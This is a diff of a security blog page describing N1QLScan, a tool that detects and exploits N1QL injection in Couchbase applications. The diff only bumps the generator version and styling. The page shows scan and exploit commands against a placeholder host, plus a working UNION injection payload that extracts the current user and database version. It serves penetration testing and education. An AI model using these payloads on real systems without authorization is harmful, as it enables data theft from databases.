@@ -3,7 +3,7 @@
   <head>
     <title>N1QLScan // FelSec - Blog</title>
     <meta charset="utf-8" />
-    <meta name="generator" content="Hugo 0.154.5">
+    <meta name="generator" content="Hugo 0.160.1">
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="author" content="FelSec" />
     <meta name="description" content="" />
@@ -101,7 +101,7 @@
 <h2 id="usage">Usage</h2>
 <h3 id="installation">Installation</h3>
 <p>It can be installed directly via the following command:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>go install github.com/felsec/n1qlscan@latest
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>go install github.com/felsec/n1qlscan@latest
 </span></span></code></pre></div><p>Alternatively, the pre-compiled binaries can be downloaded from the GitHub repos&rsquo; <a href="https://github.com/FelSec/n1qlscan/releases">Releases page</a>.</p>
 <h3 id="modes">Modes</h3>
 <p>N1QLScan has 3 modes:</p>
@@ -120,9 +120,9 @@
 <p>This mode, as the name suggests, allow you to perform custom exploitation attempts against applications or specify advanced payloads.</p>
 <h3 id="running-a-scan">Running a scan</h3>
 <p>Running a scan against a target application can either be done by specifying the URL:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>n1qlscan scan -u https://vulnerable.app/blog/post?id<span style="color:#f92672">=</span><span style="color:#ae81ff">123456</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>n1qlscan scan -u https://vulnerable.app/blog/post?id<span style="color:#f92672">=</span><span style="color:#ae81ff">123456</span>
 </span></span></code></pre></div><p>Or, by providing a request file:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>n1qlscan scan -r ./vulnerable-request
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>n1qlscan scan -r ./vulnerable-request
 </span></span></code></pre></div><p>Running <code>n1qlscan scan -h</code> gives you a comprehensive list of all of the options supported by the <code>scan</code> command.</p>
 <p>N1QLScan will then go through all of the injection points and attempt to identify any vulnerable parameters, returning the following on a successful scan:</p>
 <pre tabindex="0"><code>+============================================================+
@@ -153,9 +153,9 @@ Payload Template: p1&#39;union &lt;payload&gt;)--
 <h3 id="exploiting-a-target">Exploiting a target</h3>
 <p>After successfully scanning the target application and identifying a vulnerable parameter, the next step is to run malicious queries to extract the data from the Couchbase instance. This can be done as follows:</p>
 <p><strong>URL:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>n1qlscan exploit -u https://vulnerable.app/blog/post?id<span style="color:#f92672">=</span><span style="color:#ae81ff">123456</span> --get-current-user
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>n1qlscan exploit -u https://vulnerable.app/blog/post?id<span style="color:#f92672">=</span><span style="color:#ae81ff">123456</span> --get-current-user
 </span></span></code></pre></div><p><strong>Request File:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>n1qlscan exploit -r ./vulnerable-request --get-current-user
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>n1qlscan exploit -r ./vulnerable-request --get-current-user
 </span></span></code></pre></div><p>Running <code>n1qlscan exploit -h</code> gives you a comprehensive list of all of the options supported by the <code>exploit</code> command.</p>
 <h3 id="running-a-manual-attack">Running a manual attack</h3>
 <p>When running a manual attack you need to specify the following parts:</p>
@@ -166,7 +166,7 @@ Payload Template: p1&#39;union &lt;payload&gt;)--
 </ul>
 <pre tabindex="0"><code>n1qlscan manual {--url URL | --request FILE} --payload PAYLOAD --parameter PARAMETER
 </code></pre><p>For example:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>n1qlscan manual --url <span style="color:#e6db74">&#39;http://vulnerable.app/blog/post?id=p1&amp;debug=y&#39;</span> --parameter id --payload <span style="color:#e6db74">&#34;&#39; UNION SELECT raw {\&#34;title\&#34;:\&#34;N1QLSCAN\&#34;,\&#34;content\&#34;:\&#34;injected-\&#34;||CURRENT_USERS()[0],\&#34;id\&#34;:DS_VERSION()} )--&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>n1qlscan manual --url <span style="color:#e6db74">&#39;http://vulnerable.app/blog/post?id=p1&amp;debug=y&#39;</span> --parameter id --payload <span style="color:#e6db74">&#34;&#39; UNION SELECT raw {\&#34;title\&#34;:\&#34;N1QLSCAN\&#34;,\&#34;content\&#34;:\&#34;injected-\&#34;||CURRENT_USERS()[0],\&#34;id\&#34;:DS_VERSION()} )--&#34;</span>
 </span></span></code></pre></div><p>Running <code>n1qlscan manual -h</code> gives you a comprehensive list of all of the options supported by the <code>manual</code> command.</p>
 <h2 id="future-developments">Future Developments</h2>
 <p>As this is first there are lots of areas for improvement or new features that can be added, such as support for obfuscation methods, so keep any eye out for new releases.</p>
